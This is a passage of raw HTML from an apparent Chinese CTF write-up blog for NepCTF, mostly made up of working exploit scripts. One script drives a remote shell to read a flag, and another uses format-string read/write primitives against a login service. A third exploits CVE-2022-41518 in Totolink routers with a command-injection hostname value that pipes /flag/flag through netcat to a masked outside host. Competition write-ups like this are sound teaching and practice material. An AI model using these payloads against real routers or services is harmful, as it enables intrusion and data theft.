*</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">req = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://nepctf.1cepeak.cn:30424&quot;</span></span><br><span class=\"line\">req.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./kernel&quot;)</span></span><br><span class=\"line\">io = tube()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">io_recv_raw</span>(<span class=\"params\">*a</span>):</span><br><span class=\"line\">    r = req.get(url + <span class=\"string\">&quot;/receive&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(r.json())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r.json().get(<span class=\"string\">&#x27;output&#x27;</span>, <span class=\"string\">&quot;&quot;</span>).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">io_send_raw</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    r = req.post(url + <span class=\"string\">&quot;/send&quot;</span>, data=&#123;<span class=\"string\">&quot;input&quot;</span>: x&#125;)</span><br><span class=\"line\">    </span><br><span class=\"line\">io.recv_raw = io_recv_raw</span><br><span class=\"line\">io.send_raw = io_send_raw</span><br><span class=\"line\"><span class=\"comment\"># tob = lambda x: x.encode(&quot;utf-8&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rm</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;rm %b&quot;</span> % (file,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;cat %b&quot;</span> % (file,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">init</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Make a wish to Nepnep&quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">echo</span>(<span class=\"params\">file, content</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;echo %b&gt;%b&quot;</span> % (content, file))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mkdir</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;mkdir %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cd</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;cd %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exec</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;exec %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">id</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;id&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mount</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;mount %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;exit&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>, <span class=\"number\">127</span>):</span><br><span class=\"line\">    log.success(<span class=\"string\">f&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class=\"subst\">&#123;i&#125;</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span>)</span><br><span class=\"line\">    leave()</span><br><span class=\"line\">    req.get(url)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    init(payload + <span class=\"string\">b&quot;;&quot;</span> * (<span class=\"number\">104</span> - <span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    mkdir(<span class=\"string\">b&quot;app/templates&quot;</span>)</span><br><span class=\"line\">    cd(<span class=\"string\">b&quot;app/templates&quot;</span>)</span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;kernel&quot;</span>, <span class=\"string\">b&quot;&quot;&quot;#!/usr/bin/env -S python3 -c &quot;import os; os.system(&#x27;cat flag&#x27;)&quot; &quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;data&quot;</span>, <span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">0x100</span>-<span class=\"number\">2</span>) + <span class=\"string\">b&quot;bc&quot;</span> + <span class=\"string\">b&quot;\\x21\\x42&quot;</span>)</span><br><span class=\"line\">    cat(<span class=\"string\">b&quot;kernel&quot;</span>)</span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;step1&quot;</span>, <span class=\"string\">b&quot;mov rdi,data; syscall 0;&quot;</span>)</span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;step2&quot;</span>, <span class=\"string\">b&quot;mov rdi,data; mov rdx,258; syscall 1;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">exec</span>(<span class=\"string\">b&quot;step1&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">exec</span>(<span class=\"string\">b&quot;step2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    mount(<span class=\"string\">b&quot;kernel&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#  59  52 65 0f 37  56 </span></span><br><span class=\"line\"><span class=\"comment\"># 7c  12 3c 44 45  56</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Nep-router\"><a href=\"#Nep-router\" class=\"headerlink\" title=\"Nep router\"></a>Nep router</h2><p><a href=\"https://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518\">https://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518</a></p>\n<p>CVE-2022-41518一把梭，这里用反弹shell得到flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> contextlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.Session()</span><br><span class=\"line\">login_url = <span class=\"string\">&quot;http://106.75.63.100:34903/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;goURL=home.html&amp;action=login&quot;</span></span><br><span class=\"line\">raw = session.get(login_url, timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">inject_url = <span class=\"string\">&quot;http://106.75.63.100:34903/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class=\"line\">inject_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;proto&quot;</span>:<span class=\"string\">&quot;8&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;hostname&quot;</span>:<span class=\"string\">&quot;&#x27;;&quot;</span> + <span class=\"string\">&quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/cat /flag/flag  |nc xxx.xxx.xxx.xxx 1234 &gt;/tmp/f&quot;&quot;&quot;</span> + <span class=\"string\">&quot;;&#x27;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setOpModeCfg&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> contextlib.suppress(Exception):</span><br><span class=\"line\">    resp = session.post(inject_url, json = inject_data, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;shell!? ---------------&gt; &quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"login\"><a href=\"#login\" class=\"headerlink\" title=\"login\"></a>login</h2><p>首先是路径穿越，由于不会校验目录，可以直接访问文件，下载文件，最后可以下载得到login ELF文件以及libc库，之后逆向很快能看到sprintf格式化字符串漏洞，最难就是本地调试找堆指针</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">creat_logger</span>(<span class=\"params\">log_path, logging_name, suf_name</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(log_path):</span><br><span class=\"line\">        os.makedirs(log_path)</span><br><span class=\"line\">    log_full_path = log_path + logging_name + suf_name</span><br><span class=\"line\">    logger = logging.getLogger(logging_name)</span><br><span class=\"line\">    logger.setLevel(level=logging.DEBUG)</span><br><span class=\"line\">    handler = logging.FileHandler(log_full_path, encoding=<span class=\"string\">&#x27;UTF-8&#x27;</span>, mode=<span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">    handler.setLevel(logging.INFO)</span><br><span class=\"line\">    formatter = logging.Formatter(<span class=\"string\">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class=\"line\">    handler.setFormatter(formatter)</span><br><span class=\"line\">    console = logging.StreamHandler()</span><br><span class=\"line\">    console.setLevel(logging.DEBUG)</span><br><span class=\"line\">    logger.addHandler(handler)</span><br><span class=\"line\">    logger.addHandler(console)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> logger</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">logger = creat_logger(<span class=\"string\">&quot;./&quot;</span>, <span class=\"string\">&quot;log&quot;</span>, <span class=\"string\">&quot;.txt&quot;</span>)</span><br><span class=\"line\">req = requests.session()</span><br><span class=\"line\">start = <span class=\"string\">b&quot;deadbeaf&quot;</span></span><br><span class=\"line\">end = <span class=\"string\">b&quot;asdewedv&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://106.75.63.100:34617&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># url = &quot;http://172.20.192.1:8080&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read_s</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> offset &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        offset += <span class=\"number\">2</span> ** <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = req.get(url + <span class=\"string\">&quot;/login&quot;</span>, params=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;user&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;start.decode()&#125;</span>%<span class=\"subst\">&#123;offset&#125;</span>$s<span class=\"subst\">&#123;end.decode()&#125;</span>&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;aaaa&quot;</span></span><br><span class=\"line\">            &#125;, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> ConnectionResetError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> TimeoutError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ConnectTimeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">    s = r.content</span><br><span class=\"line\">    <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">    code = s[s.find(start) + <span class=\"built_in\">len</span>(start):s.find(end)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> code, <span class=\"built_in\">hex</span>(struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, code[:<span class=\"number\">8</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\00&quot;</span>))[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_p</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> offset &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        offset += <span class=\"number\">2</span> ** <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = req.get(url + <span class=\"string\">&quot;/login&quot;</span>, params=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;user&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;start.decode()&#125;</span>%<span class=\"subst\">&#123;offset&#125;</span>$p<span class=\"subst\">&#123;end.decode()&#125;</span>&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;aaaa&quot;</span></span><br><span class=\"line\">            &#125;, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> ConnectionResetError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> TimeoutError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ConnectTimeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">    s = r.content</span><br><span class=\"line\">    code = s[s.find(start) + <span class=\"built_in\">len</span>(start):s.find(end)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> code</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">offset, x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> offset &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        offset += <span class=\"number\">2</span> ** <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = req.get(url + <span class=\"string\">&quot;/login&quot;</span>, params=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;user&quot;</span>: <span class=\"string\">f&quot;%1000$<span class=\"subst\">&#123;x&#125;</span>c%<span class=\"subst\">&#123;offset&#125;</span>$hhn&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;aaaa&quot;</span></span><br><span class=\"line\">            &#125;, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> ConnectionResetError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> TimeoutError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ConnectTimeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># p = 15196</span></span><br><span class=\"line\"><span class=\"comment\"># write(p, 0x58)</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p2 = 15513</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_s</span>(<span class=\"params\">sx</span>):</span><br><span class=\"line\">    s = struct.pack(<span class=\"string\">&quot;&lt;Q&quot;</span>, sx).strip(<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(s)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">        p = <span class=\"number\">15196</span></span><br><span class=\"line\">        write(p, <span class=\"number\">0x78</span> + i)</span><br><span class=\"line\">        <span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\">        p2 = <span class=\"number\">15511</span></span><br><span class=\"line\">        write(p2, s[i])</span><br><span class=\"line\">        <span class=\"comment\"># print(f&quot;[+] &#123;get_p(p2)&#125; =&gt; &#123;read_s(p2)&#125;&quot;)</span></span><br><span class=\"line\">        p3 = <span class=\"number\">15518</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] <span class=\"subst\">&#123;get_p(p3)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(15712)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># # xt = int(get_p(15712).decode(), 16)</span></span><br><span class=\"line\"><span class=\"comment\"># # print(f&quot;[+] &#123;xt:#x&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(15512)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(16110)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># # print(f&quot;[+] &#123;get_p(15712)&#125; =&gt; &#123;read_s(15712)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(1, 0x31, 8):</span></span><br><span class=\"line\"><span class=\"comment\"># x = xt + i</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;x:#x&#125;&quot;)</span></span><br><span class=\"line\">heap_base = <span class=\"built_in\">int</span>(get_p(<span class=\"number\">15059</span>).decode(), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-&gt;] <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">xt = heap_base- <span class=\"number\">0x40</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-&gt;] <span class=\"subst\">&#123;xt:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">write_s(xt)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] done&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(read_s(<span class=\"number\">15518</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write_s(0xdeadbeafdeadbeaf)</span></span><br><span class=\"line\"><span class=\"comment\"># p = 15196</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p = 15513</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p = 15516</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(0x3d5b-10, 0x3d5b+100):</span></span><br><span class=\"line\"><span class=\"comment\">#     code = get_p(i)</span></span><br><span class=\"line\"><span class=\"comment\">#     if code.startswith(b&quot;0x55&quot;) or code.startswith(b&quot;0x7f&quot;) and len(code):</span></span><br><span class=\"line\"><span class=\"comment\">#         content = read_s(i)</span></span><br><span class=\"line\"><span class=\"comment\">#         # print(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125; =&gt; &#123;content&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#         logger.warning(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125; =&gt; &#123;content&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#         continue</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#     logger.info(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125;&quot;)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HRP-CHAT\"><a href=\"#HRP-CHAT\" class=\"headerlink\" 